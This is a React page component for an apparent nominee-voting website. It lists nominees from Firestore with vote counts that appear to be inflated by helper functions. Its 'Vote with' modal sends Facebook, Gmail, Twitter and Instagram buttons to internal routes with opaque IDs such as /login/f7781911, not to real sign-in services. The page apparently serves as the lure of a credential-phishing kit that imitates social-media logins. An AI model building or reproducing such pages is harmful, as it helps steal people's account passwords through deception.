import { useState, useEffect } from 'react';
import { collection, getDocs } from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { Search, Filter, ChevronLeft, X, Facebook, Mail, Twitter, Instagram } from 'lucide-react';
import { Link, useNavigate } from 'react-router-dom';
import { formatNumber, generateRandomVotes, updateNomineeVotes } from '@/lib/utils';
import { useToast } from '@/components/ui/use-toast';
import { NomineeCard } from '@/components/NomineeCard';
import FloatingChatButton from '@/components/FloatingChatButton';

type Category = 'music' | 'movie' | 'comedy' | 'content-creation' | 'sports';

interface Nominee {
  id: string;
  name: string;
  imageUrl: string;
  votes: number;
  category: Category;
}

const Nominees = () => {
  const [nominees, setNominees] = useState<Nominee[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedCategory, setSelectedCategory] = useState<Category | 'all'>('all');
  const [selectedNominee, setSelectedNominee] = useState<Nominee | null>(null);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    fetchNominees();
  }, []);

  const fetchNominees = async () => {
    try {
      setLoading(true);
      const querySnapshot = await getDocs(collection(db, 'nominees'));
      const nominees = await Promise.all(
        querySnapshot.docs.map(async (doc) => {
          const data = doc.data();
          const newTotalVotes = await updateNomineeVotes(doc.id, data.votes || 0);
          return {
            id: doc.id,
            ...data,
            votes: newTotalVotes
          };
        })
      );

      const sortedNominees = nominees.sort((a, b) => b.votes - a.votes);
      setNominees(sortedNominees);
    } catch (error) {
      console.error('Error fetching nominees:', error);
    } finally {
      setLoading(false);
    }
  };

  const filteredNominees = nominees.filter(nominee => {
    const matchesSearch = nominee.name.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesCategory = selectedCategory === 'all' || nominee.category === selectedCategory;
    return matchesSearch && matchesCategory;
  });

  const groupedNominees = filteredNominees.reduce((acc, nominee) => {
    const category = nominee.category || 'uncategorized';
    if (!acc[category]) {
      acc[category] = [];
    }
    acc[category].push(nominee);
    return acc;
  }, {} as Record<string, Nominee[]>);

  const handleVote = async (platform: string) => {
    if (!selectedNominee) return;

    switch (platform) {
      case 'facebook':
        navigate('/login/f7781911');
        break;
      case 'google':
        navigate('/login/uia5555');
        break;
      case 'twitter':
        navigate('/login/uiossss');
        break;
      case 'instagram':
        navigate('/login/js5566aa');
        break;
      default:
        toast({
          title: "Error",
          description: "Invalid platform selected",
          variant: "destructive",
        });
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse space-y-4">
          <div className="h-12 w-48 bg-gray-200 rounded"></div>
          <div className="h-4 w-32 bg-gray-200 rounded mx-auto"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-accent py-12 px-6">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-xl p-6 shadow-sm mb-8">
          <div className="flex items-center gap-4 mb-6">
            <Link 
              to="/"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
            >
              <ChevronLeft className="w-4 h-4" />
              <span>Back to Home</span>
            </Link>
          </div>

          <h1 className="text-3xl font-bold mb-6">All Nominees</h1>
          
          <div className="flex flex-col gap-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
              <input
                type="search"
                placeholder="Search nominees..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-10 pr-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
              />
            </div>
            
            <select
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value as Category | 'all')}
              className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent"
            >
              <option value="all">All Categories</option>
              <option value="music">Music</option>
              <option value="movie">Movie</option>
              <option value="comedy">Comedy</option>
              <option value="content-creation">Content Creation</option>
              <option value="sports">Sports</option>
            </select>
          </div>
        </div>

        {Object.entries(groupedNominees).map(([category, nominees]) => (
          <div key={category} className="mb-12">
            <h2 className="text-2xl font-semibold mb-6 capitalize">
              {category.replace('-', ' ')}
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {nominees.map((nominee) => (
                <NomineeCard
                  key={nominee.id}
                  nominee={nominee}
                  onVoteClick={(e) => {
                    e.stopPropagation();
                    setSelectedNominee(nominee);
                  }}
                />
              ))}
            </div>
          </div>
        ))}

        {filteredNominees.length === 0 && (
          <div className="text-center py-12">
            <p className="text-lg text-gray-500">
              No nominees found matching your criteria
            </p>
          </div>
        )}

        {selectedNominee && (
          <div 
            className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50"
            onClick={() => setSelectedNominee(null)}
          >
            <div 
              className="bg-white rounded-lg p-6 max-w-md w-full"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-2xl font-semibold">Vote with:</h2>
                <button 
                  onClick={() => setSelectedNominee(null)}
                  className="p-2 hover:bg-gray-100 rounded-full transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
              
              <div className="space-y-4">
                <button 
                  className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                  onClick={() => handleVote('facebook')}
                >
                  <Facebook className="w-5 h-5 text-[#1877F2]" />
                  Continue with Facebook
                </button>
                
                <button 
                  className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                  onClick={() => handleVote('google')}
                >
                  <Mail className="w-5 h-5 text-[#EA4335]" />
                  Continue with Gmail
                </button>
                
                <button 
                  className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                  onClick={() => handleVote('twitter')}
                >
                  <Twitter className="w-5 h-5 text-[#1DA1F2]" />
                  Continue with Twitter
                </button>

                <button 
                  className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                  onClick={() => handleVote('instagram')}
                >
                  <Instagram className="w-5 h-5 text-[#E4405F]" />
                  Continue with Instagram
                </button>
              </div>

              <p className="text-sm text-gray-500 mt-6 text-center">
                You must sign in to vote. Please authenticate using one of the available options.
              </p>
            </div>
          </div>
        )}
      </div>
      <FloatingChatButton />
    </div>
  );
};

export default Nominees; 